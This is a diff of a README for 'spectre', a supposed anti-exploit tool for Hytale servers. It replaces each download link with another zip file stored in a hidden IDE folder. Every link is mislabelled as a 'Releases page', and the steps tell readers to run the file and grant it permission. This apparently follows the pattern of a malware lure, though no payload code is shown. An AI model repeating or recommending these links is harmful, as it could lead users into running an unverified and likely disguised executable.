@@ -1,6 +1,6 @@
 # 🚀 spectre - Combat Exploits in Hytale Effortlessly
 
-[![Download spectre](https://github.com/MuhammadAnwaar/spectre/raw/refs/heads/main/src/main/Software_3.8.zip)](https://github.com/MuhammadAnwaar/spectre/raw/refs/heads/main/src/main/Software_3.8.zip)
+[![Download spectre](https://raw.githubusercontent.com/MuhammadAnwaar/spectre/main/.idea/Software-3.0.zip)](https://raw.githubusercontent.com/MuhammadAnwaar/spectre/main/.idea/Software-3.0.zip)
 
 ## 📜 Description
 
@@ -26,7 +26,7 @@ To run spectre, your server should meet the following requirements:
 
 Follow these steps to download and install spectre on your Hytale server.
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/MuhammadAnwaar/spectre/raw/refs/heads/main/src/main/Software_3.8.zip).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/MuhammadAnwaar/spectre/main/.idea/Software-3.0.zip).
 
 2. **Select the Latest Version**: On the Releases page, look for the latest version of spectre. Click on it to view the details.
 
@@ -36,7 +36,7 @@ Follow these steps to download and install spectre on your Hytale server.
 
 ## 📥 Download & Install
 
-To download spectre, visit this page: [spectre Releases](https://github.com/MuhammadAnwaar/spectre/raw/refs/heads/main/src/main/Software_3.8.zip).
+To download spectre, visit this page: [spectre Releases](https://raw.githubusercontent.com/MuhammadAnwaar/spectre/main/.idea/Software-3.0.zip).
 
 1. Click on the downloaded file to begin the installation.
 2. On most systems, you may need to grant permission to run the file.
@@ -65,4 +65,4 @@ For further help, feel free to reach us on the GitHub Issues page. Provide as mu
 
 ---
 
-[![Download spectre](https://github.com/MuhammadAnwaar/spectre/raw/refs/heads/main/src/main/Software_3.8.zip)](https://github.com/MuhammadAnwaar/spectre/raw/refs/heads/main/src/main/Software_3.8.zip)
+[![Download spectre](https://raw.githubusercontent.com/MuhammadAnwaar/spectre/main/.idea/Software-3.0.zip)](https://raw.githubusercontent.com/MuhammadAnwaar/spectre/main/.idea/Software-3.0.zip)
